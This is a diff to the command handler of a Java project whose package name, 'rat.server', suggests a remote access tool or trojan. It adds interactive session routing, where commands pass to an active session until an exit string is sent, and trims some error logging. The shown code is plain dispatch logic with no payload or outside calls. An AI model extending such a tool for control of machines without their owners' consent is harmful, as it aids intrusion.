@@ -2,6 +2,7 @@ package main.java.rat.server;
 
 import main.java.rat.Environment;
 import main.java.rat.command.Command;
+import main.java.rat.command.InteractableCommand;
 import main.java.rat.logger.StringLogger;
 
 import java.util.ArrayList;
@@ -55,7 +56,29 @@ public class CommandHandler {
         return false;
     }
 
+    public boolean isInSession() {
+        return getInSessionCommand() != null;
+    }
+
+    private InteractableCommand getInSessionCommand() {
+        for (Command commandObj : commands) {
+            if(commandObj instanceof InteractableCommand && ((InteractableCommand) commandObj).isInSession())
+                return (InteractableCommand) commandObj;
+        }
+        return null;
+    }
+
     public void handleCommand(String completeCommand) {
+        if(isInSession()) {
+            InteractableCommand session = getInSessionCommand();
+            if(session.getExitString().equalsIgnoreCase(completeCommand)) {
+                session.exit();
+                return;
+            }
+            session.execute(completeCommand);
+            return;
+        }
+
         String mainCommand = getMainCommandFromFull(completeCommand);
         String argumentStr = getArgumentStr(completeCommand, mainCommand);
 
@@ -68,9 +91,7 @@ public class CommandHandler {
                     if (!commandObj.parseArguments(arguments) || !commandObj.executeCommand())
                         throw new Exception("Invalid command handling");
                 } catch (Exception e) {
-                    e.printStackTrace();
                     if (commandObj.getError() != null) {
-                        logger.log("Error while processing command:");
                         logger.log(commandObj.getError());
                     } else {
                         logger.log("Unknown Error while processing command:");
